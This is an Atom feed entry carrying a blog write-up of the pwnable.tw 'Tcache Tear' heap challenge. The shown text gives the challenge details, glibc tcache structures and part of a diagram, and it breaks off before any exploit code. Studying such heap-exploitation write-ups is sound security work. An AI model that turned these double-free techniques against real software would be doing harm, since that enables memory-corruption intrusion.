<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
	<title> - double-free</title>
	<link href="https://blog.srikavin.me/tags/double-free/atom.xml" rel="self" type="application/atom+xml"/>
  <link href="https://blog.srikavin.me/"/>
	<generator uri="https://www.getzola.org/">Zola</generator>
	<updated>2020-03-02T18:52:31.838+00:00</updated>
	<id>https://blog.srikavin.me/tags/double-free/atom.xml</id>
	<entry xml:lang="en">
		<title>pwnable.tw - Tcache Tear</title>
		<published>2020-02-23T07:19:49.665+00:00</published>
		<updated>2020-03-02T18:52:31.838+00:00</updated>
		<link href="https://blog.srikavin.me/posts/pwnable-tw-tcache-tear/" type="text/html"/>
		<id>https://blog.srikavin.me/posts/pwnable-tw-tcache-tear/</id>
		<content type="html">&lt;h1 id=&quot;challenge&quot;&gt;Challenge&lt;&#x2F;h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Make tcache great again !&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;nc chall.pwnable.tw 10207&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;pwnable.tw&#x2F;static&#x2F;chall&#x2F;tcache_tear&quot;&gt;tcache_tear&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;pwnable.tw&#x2F;static&#x2F;libc&#x2F;libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so&quot;&gt;libc.so&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;background&quot;&gt;Background&lt;&#x2F;h1&gt;
&lt;p&gt;Per-thread cache (tcache) is an optimization enabled in versions of &lt;code&gt;libc&lt;&#x2F;code&gt; after 2.26. To increase heap performance, 
security checks are limited within the tcache implementation. Tcache is implemented using two important internal structures:&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h2 id=&quot;tcache-perthread-struct&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;bminor&#x2F;glibc&#x2F;blob&#x2F;release&#x2F;2.27&#x2F;master&#x2F;malloc&#x2F;malloc.c#L2916&quot;&gt;tcache_perthread_struct&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;typedef struct&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; tcache_perthread_struct
{
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; counts[TCACHE_MAX_BINS];
  tcache_entry &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;There is maximum number of entries and bins within the tcache that are defined at compile time.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;tcache-entry&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;bminor&#x2F;glibc&#x2F;blob&#x2F;release&#x2F;2.27&#x2F;master&#x2F;malloc&#x2F;malloc.c#L2904&quot;&gt;tcache_entry&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;typedef struct&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; tcache_entry
{
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;struct&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; tcache_entry &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;next;
} tcache_entry;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This structure is placed within the user area of a chunk when it is freed, i.e. it is placed at the address returned by &lt;code&gt;malloc&lt;&#x2F;code&gt;. This has some security implications.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;behind-the-scenes-tcache&quot;&gt;Behind the Scenes: tcache&lt;&#x2F;h1&gt;
&lt;p&gt;The below diagram depicts normal operation of tcache with the given initial conditions.&lt;&#x2F;p&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;
&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; xmlns:xlink=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; version=&quot;1.1&quot; width=&quot;711px&quot; height=&quot;1251px&quot; viewBox=&quot;-0.5 -0.5 711 1251&quot;&gt;&lt;defs&#x2F;&gt;&lt;g&gt;&lt;rect x=&quot;250&quot; y=&quot;360&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 385px; margin-left: 305px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;&lt;b&gt;NULL&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;305&quot; y=&quot;389&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;NULL&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;0&quot; y=&quot;80&quot; width=&quot;160&quot; height=&quot;100&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 80px; margin-left: 0px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 100%&quot;&gt;&lt;b&gt;tcache_perthread_struct&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr size=&quot;1&quot; &#x2F;&gt;   char counts[]&lt;br &#x2F;&gt;&lt;hr &#x2F;&gt;   tcache_entry *entries[]&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x7ffff7dcfc40&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;0&quot; y=&quot;92&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_perthread_struct   c...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 385 280 L 400 280 L 400 340 L 305 340 L 305 353.63&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 305 358.88 L 301.5 351.88 L 305 353.63 L 308.5 351.88 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;225&quot; y=&quot;240&quot; width=&quot;160&quot; height=&quot;80&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 240px; margin-left: 225px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 120%&quot;&gt;&lt;b&gt;tcache_entry&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr &#x2F;&gt;   tcache_entry *next&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x603260&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;225&quot; y=&quot;252&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_entry   tcache_entry...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;240&quot; y=&quot;60&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 260 60 L 240 60 L 240 200 L 260 200&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 305 155 L 305 233.63&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 305 238.88 L 301.5 231.88 L 305 233.63 L 308.5 231.88 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;250&quot; y=&quot;105&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 130px; margin-left: 305px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;Bin&lt;br &#x2F;&gt;1&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;305&quot; y=&quot;134&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;430&quot; y=&quot;105&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 130px; margin-left: 485px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;&lt;font style=&quot;font-size: 12px&quot;&gt;Bin &lt;br &#x2F;&gt;&lt;span style=&quot;background-color: rgb(255 , 255 , 255) ; font-family: &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace ; white-space: pre&quot;&gt;TCACHE_MAX_BINS&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;485&quot; y=&quot;134&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;ellipse cx=&quot;375&quot; cy=&quot;130&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;395&quot; cy=&quot;130&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;415&quot; cy=&quot;130&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;530&quot; y=&quot;60&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; transform=&quot;rotate(-180,540,130)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 550 60 L 530 60 L 530 200 L 550 200&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; transform=&quot;rotate(-180,540,130)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 160 145 L 233.63 145&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 238.88 145 L 231.88 148.5 L 233.63 145 L 231.88 141.5 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;250&quot; y=&quot;770&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 795px; margin-left: 305px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;&lt;b&gt;NULL&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;305&quot; y=&quot;799&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;NULL&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;0&quot; y=&quot;490&quot; width=&quot;160&quot; height=&quot;100&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 490px; margin-left: 0px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 100%&quot;&gt;&lt;b&gt;tcache_perthread_struct&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr size=&quot;1&quot; &#x2F;&gt;   char counts[]&lt;br &#x2F;&gt;&lt;hr &#x2F;&gt;   tcache_entry *entries[]&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x7ffff7dcfc40&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;0&quot; y=&quot;502&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_perthread_struct   c...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;225&quot; y=&quot;650&quot; width=&quot;160&quot; height=&quot;80&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 650px; margin-left: 225px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 120%&quot;&gt;&lt;b&gt;tcache_entry&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr &#x2F;&gt;   tcache_entry *next&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x603260&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;225&quot; y=&quot;662&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_entry   tcache_entry...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;240&quot; y=&quot;470&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 260 470 L 240 470 L 240 610 L 260 610&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 305 565 L 305 610 L 420 610 L 420 750 L 305 750 L 305 763.63&quot; fill=&quot;none&quot; stroke=&quot;#b85450&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 305 768.88 L 301.5 761.88 L 305 763.63 L 308.5 761.88 Z&quot; fill=&quot;#b85450&quot; stroke=&quot;#b85450&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;250&quot; y=&quot;515&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 540px; margin-left: 305px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;Bin&lt;br &#x2F;&gt;1&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;305&quot; y=&quot;544&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;430&quot; y=&quot;515&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 540px; margin-left: 485px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;&lt;font style=&quot;font-size: 12px&quot;&gt;Bin &lt;br &#x2F;&gt;&lt;span style=&quot;background-color: rgb(255 , 255 , 255) ; font-family: &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace ; white-space: pre&quot;&gt;TCACHE_MAX_BINS&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;485&quot; y=&quot;544&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;ellipse cx=&quot;375&quot; cy=&quot;540&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;395&quot; cy=&quot;540&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;415&quot; cy=&quot;540&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;530&quot; y=&quot;470&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; transform=&quot;rotate(-180,540,540)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 550 470 L 530 470 L 530 610 L 550 610&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; transform=&quot;rotate(-180,540,540)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 160 555 L 233.63 555&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 238.88 555 L 231.88 558.5 L 233.63 555 L 231.88 551.5 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 140 690 L 218.63 690&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 223.88 690 L 216.88 693.5 L 218.63 690 L 216.88 686.5 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;20&quot; y=&quot;660&quot; width=&quot;120&quot; height=&quot;60&quot; fill=&quot;#ffffff&quot; 